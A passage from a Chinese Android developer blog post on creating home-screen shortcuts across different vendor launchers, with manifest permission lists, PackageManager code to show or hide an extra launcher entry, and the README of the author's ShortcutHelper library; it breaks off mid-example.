<p>但是，在其它ROM上呢，例如华为，你需要这样的权限：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher3.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher3.permission.WRITE_SETTINGS"</span> /&gt;</span><br></pre></td></tr></table></figure></p>
<p>为了程序能够通用性够强，理论上我们得为所有不使用原生Launcher权限的Launcher配置权限代码，是的，你没  听错，是所有，只有通过这种奇技淫巧，才能适配更多的Launcher，这里贴一部分给大家爽一下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="property">name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"android.permission.WRITE_SETTINGS"</span>/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.INSTALL_SHORTCUT"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.UNINSTALL_SHORTCUT"</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher2.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher2.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher3.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher3.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adw.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adw.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.htc.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.htc.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.qihoo360.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.qihoo360.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.lge.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.lge.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"net.qihoo.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"net.qihoo.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adwfreak.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adwfreak.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adw.launcher_donut.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"org.adw.launcher_donut.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher3.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher3.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.fede.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.fede.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.sec.android.app.twlauncher.settings.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.sec.android.app.twlauncher.settings.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.anddoes.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.anddoes.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.tencent.qqlauncher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.tencent.qqlauncher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher2.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.launcher2.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.mylauncher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.mylauncher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.ebproductions.android.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.ebproductions.android.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.oppo.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.oppo.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.miui.mihome2.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.miui.mihome2.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.android.launcher.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.huawei.android.launcher.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"telecom.mdesk.permission.READ_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"telecom.mdesk.permission.WRITE_SETTINGS"</span> /&gt;</span><br><span class="line">  &lt;uses-permission android:<span class="property">name</span>=<span class="string">"dianxin.permission.ACCESS_LAUNCHER_DATA"</span> /&gt;</span><br></pre></td></tr></table></figure></p>
<p>这时候大家肯定要问了，你申请这么多权限，用户在安装App的时候，不是要崩溃了，尼玛，这么多看都看不过来啊，其实，根本不需要担心，因为这些基本都是各自ROM中的第三方ROM权限，在用户安装的时候，他们通常会被解析成原生Launcher的权限，例如：添加、修改桌面快捷方式。并不会将所有的权限都写出来。</p>
<h1 id="u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u897F_u57DF_u6D3E"><a href="#u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u897F_u57DF_u6D3E" class="headerlink" title="创建快捷方式之——西域派"></a>创建快捷方式之——西域派</h1><blockquote>
<p>所谓西域派，是因为我想不出其他名字了。西域一派，使用其他方式来实现类似快捷方式的方法。</p>
</blockquote>
<p>快捷方式的确是我们为应用导流的一个非常重要的入口，但是，由于碎片化实在太严重，所以，我们可以使用在Launcher App列表中为应用增加一个入口的方式来为App导流，简单的说，就是增进一个App的入口Activity。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">activity</span> <span class="attribute">android:name</span>=<span class="value">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">    <span class="attribute">android:name</span>=<span class="value">"com.hujiang.hj_shortcut_lib.HJShortcutActivity"</span></span><br><span class="line">    <span class="attribute">android:theme</span>=<span class="value">"@style/Base.Theme.AppCompat.Dialog"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>非常简单，相信大家都知道这种方式来给App增加一个Activity入口。但是，这种方式，我们如何能够自由的控制这个入口是否显示呢？</p>
<h1 id="u5947_u6280PackageManager"><a href="#u5947_u6280PackageManager" class="headerlink" title="奇技PackageManager"></a>奇技PackageManager</h1><p>PackageManager提供了一系列Package的管理方法，当然，也包含了我们非常关心的启用、停用组件这一方法，这个方法在Root情况下，可以修改任一App的任意组件，在普通情况下，对自身App有绝对权限。使用方法也非常简单：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">toggleFlowEntrance</span><span class="params">(Context context, Class launcherClass)</span> </span>&#123;</span><br><span class="line">       PackageManager packageManager = context.getPackageManager();</span><br><span class="line">       ComponentName componentName = <span class="keyword">new</span> ComponentName(context, launcherClass);</span><br><span class="line">       <span class="keyword">int</span> res = packageManager.getComponentEnabledSetting(componentName);</span><br><span class="line">       <span class="keyword">if</span> (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT ||</span><br><span class="line">               res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) &#123;</span><br><span class="line">           <span class="comment">// 隐藏应用图标</span></span><br><span class="line">           packageManager.setComponentEnabledSetting(</span><br><span class="line">                   componentName,</span><br><span class="line">                   PackageManager.COMPONENT_ENABLED_STATE_DISABLED,</span><br><span class="line">                   PackageManager.DONT_KILL_APP);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// 显示应用图标</span></span><br><span class="line">           packageManager.setComponentEnabledSetting(</span><br><span class="line">                   componentName,</span><br><span class="line">                   PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,</span><br><span class="line">                   PackageManager.DONT_KILL_APP);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1 id="u4E00_u7EDF_u6C5F_u6E56"><a href="#u4E00_u7EDF_u6C5F_u6E56" class="headerlink" title="一统江湖"></a>一统江湖</h1><p>前面我们分析了各种快捷方式、Launcher入口的方式来对App进行导流，当然，这不是我们的目的，我们的目的是能够掌握Android快捷方式的哭花宝典而不用那个啥。</p>
<p>所以，下面我封装了一个shortcut的开源库，从而可以尽可能的忽略ROM的差异，来使用快捷方式和Launcher入口。</p>
<p>项目地址：<br><a href="https://github.com/xuyisheng/ShortcutHelper" target="_blank" rel="external">https://github.com/xuyisheng/ShortcutHelper</a></p>
<p>目前该项目还在测试阶段，还要很多问题和适配bug需要解决，欢迎大家提issue。</p>
<p>README如下：</p>
<h1 id="ShortcutLib_u4F7F_u7528_u6307_u5357"><a href="#ShortcutLib_u4F7F_u7528_u6307_u5357" class="headerlink" title="ShortcutLib使用指南"></a>ShortcutLib使用指南</h1><p>本项目目前还在测试阶段，请大家多提issue，共同完善。</p>
<h1 id="u9879_u76EE_u610F_u4E49"><a href="#u9879_u76EE_u610F_u4E49" class="headerlink" title="项目意义"></a>项目意义</h1><p>快速使用shortcut，避免各种ROM适配导致的各种问题。</p>
<p>#</p>
<ul>
<li>增加快捷方式</li>
</ul>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">   <span class="keyword">*</span> 添加快捷方式</span><br><span class="line">   <span class="keyword">*</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param context      context</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param actionIntent 要启动的Intent</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param name         name</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param allowRepeat  是否允许重复</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param iconBitmap   快捷方式图标</span></span><br><span class="line">   <span class="keyword">*</span>/</span><br><span class="line">  public static void addShortcut(Context context, Intent actionIntent, String name,</span><br><span class="line">                                 boolean allowRepeat, Bitmap iconBitmap)</span><br></pre></td></tr></table></figure>
<ul>
<li>判断快捷方式是否存在</li>
</ul>
<p>基础方式</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> 判断快捷方式是否存在</span><br><span class="line">     <span class="keyword">*</span> <span class="variable">&lt;p/&gt;</span></span><br><span class="line">     <span class="keyword">*</span> 检查快捷方式是否存在 <span class="variable">&lt;br/&gt;</span></span><br><span class="line">     <span class="keyword">*</span> <span class="variable">&lt;font color=red&gt;</span>注意：<span class="variable">&lt;/font&gt;</span> 有些手机无法判断是否已经创建过快捷方式<span class="variable">&lt;br/&gt;</span></span><br><span class="line">     <span class="keyword">*</span> 因此，在创建快捷方式时，请添加<span class="variable">&lt;br/&gt;</span></span><br><span class="line">     <span class="keyword">*</span> shortcutIntent.putExtra(<span class="string">"duplicate"</span>, false);// 不允许重复创建<span class="variable">&lt;br/&gt;</span></span><br><span class="line">     <span class="keyword">*</span> 最好使用&#123;<span class="comment">@link #isShortCutExist(Context, String, Intent)&#125;</span></span><br><span class="line">     <span class="keyword">*</span> 进行判断，因为可能有些应用生成的快捷方式名称是一样的的<span class="variable">&lt;br/&gt;</span></span><br><span class="line">     <span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param context context</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param title   快捷方式名</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@return 是否存在</span></span><br><span class="line">     <span class="keyword">*</span>/</span><br><span class="line">    public static boolean isShortCutExist(Context context, String title)</span><br></pre></td></tr></table></figure>
<p>严格方式（增加Intent的检查）</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> 判断快捷方式是否存在</span><br><span class="line">    <span class="keyword">*</span> <span class="variable">&lt;p/&gt;</span></span><br><span class="line">    <span class="keyword">*</span> 不一定所有的手机都有效，因为国内大部分手机的桌面不是系统原生的<span class="variable">&lt;br/&gt;</span></span><br><span class="line">    <span class="keyword">*</span> 更多请参考&#123;<span class="comment">@link #isShortCutExist(Context, String)&#125;&lt;br/&gt;</span></span><br><span class="line">    <span class="keyword">*</span> 桌面有两种，系统桌面(ROM自带)与第三方桌面，一般只考虑系统自带<span class="variable">&lt;br/&gt;</span></span><br><span class="line">    <span class="keyword">*</span> 第三方桌面如果没有实现系统响应的方法是无法判断的，比如GO桌面<span class="variable">&lt;br/&gt;</span></span><br><span class="line">    <span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param context context</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param title   快捷方式名</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param intent  快捷方式Intent</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@return 是否存在</span></span><br><span class="line">    <span class="keyword">*</span>/</span><br><span class="line">   public static boolean isShortCutExist(Context context, String title, Intent intent)</span><br></pre></td></tr></table></figure>
<h1 id="u66F4_u65B0_u5FEB_u6377_u65B9_u5F0F"><a href="#u66F4_u65B0_u5FEB_u6377_u65B9_u5F0F" class="headerlink" title="更新快捷方式"></a>更新快捷方式</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> 更新桌面快捷方式图标，不一定所有图标都有效(有可能需要系统权限)</span><br><span class="line">     <span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param context context</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param title   快捷方式名</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param intent  快捷方式Intent</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param bitmap  快捷方式Icon</span></span><br><span class="line">     <span class="keyword">*</span>/</span><br><span class="line">    public static void updateShortcutIcon(Context context, String title, Intent intent, Bitmap bitmap)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，更新快捷方式在很多手机上都不能生效，需要系统权限。可以通过先删除、再新增的方式来实现。</p>
</blockquote>
<h1 id="u4E3A_u4EFB_u610FPackageName_u7684App_u6DFB_u52A0_u5FEB_u6377_u65B9_u5F0F-1"><a href="#u4E3A_u4EFB_u610FPackageName_u7684App_u6DFB_u52A0_u5FEB_u6377_u65B9_u5F0F-1" class="headerlink" title="为任意PackageName的App添加快捷方式"></a>为任意PackageName的App添加快捷方式</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> 为任意PackageName的App添加快捷方式</span><br><span class="line">    <span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param context context</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param pkg     待添加快捷方式的应用包名</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@return 返回true为正常执行完毕</span></span><br><span class="line">    <span class="keyword">*</span>/</span><br><span class="line">   public static boolean addShortcutByPackageName(Context context, String pkg)</span><br></pre></td></tr></table></figure>
<h1 id="u79FB_u9664_u5FEB_u6377_u65B9_u5F0F"><a href="#u79FB_u9664_u5FEB_u6377_u65B9_u5F0F" class="headerlink" title="移除快捷方式"></a>移除快捷方式</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> 移除快捷方式</span><br><span class="line">    <span class="keyword">*</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param context      context</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param actionIntent 要启动的Intent</span></span><br><span class="line">    <span class="keyword">*</span> <span class="comment">@param name         name</span></span><br><span class="line">    <span class="keyword">*</span>/</span><br><span class="line">   public static void removeShortcut(Context context, Intent actionIntent, String name)</span><br></pre></td></tr></table></figure>
<h1 id="u663E_u793A_u9690_u85CFLauncher_u5165_u53E3"><a href="#u663E_u793A_u9690_u85CFLauncher_u5165_u53E3" class="headerlink" title="显示隐藏Launcher入口"></a>显示隐藏Launcher入口</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> 显示\隐藏Launcher入口</span><br><span class="line">     <span class="keyword">*</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param context       context</span></span><br><span class="line">     <span class="keyword">*</span> <span class="comment">@param launcherClass launcherClass</span></span><br><span class="line">     <span class="keyword">*</span>/</span><br><span class="line">    public static void toggleFlowEntrance(Context context, Class launcherClass)</span><br></pre></td></tr></table></figure>
<p>使用Launcher入口需要在AndroidMainifest文件中注册新增的入口Activity，例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">activity</span> <span class="attribute">android:name</span>=<span class="value">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">    <span class="attribute">android:name</span>=<span class="value">"com.xxx.xxxxx"</span></span><br><span class="line">    <span class="attribute">android:theme</span>=<span class="value">"@style/Base.Theme.AppCompat.Dialog"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="u4F7F_u7528_u793A_u4F8B"><a href="#u4F7F_u7528_u793A_u4F8B" class="headerlink" title="使用示例"></a>使用示例</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addShortcutTest</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 系统方式创建</span></span><br><span class="line">      <span class="comment">// ShortcutUtils.addShortcut(this, getShortCutIntent(), mShortcutName);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 创建前判断是否存在</span></span><br><span class="line">      <span class="keyword">if</span> (!ShortcutSuperUtils.isShortCutExist(<span class="keyword">this</span>, mShortcutName, getShortCutIntent())) &#123;</span><br><span class="line">          ShortcutUtils.addShortcut(<span class="keyword">this</span>, getShortCutIntent(), mShortcutName, <span class="literal">false</span>,</span><br><span class="line">                  BitmapFactory.decodeResource(getResources(), com.hujiang.hj_shortcut_lib.R.drawable.ocsplayer));</span><br><span class="line">          finish();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          Toast.makeText(<span class="keyword">this</span>, <span class="string">"Shortcut is exist!"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">      &#125;</span><br><span 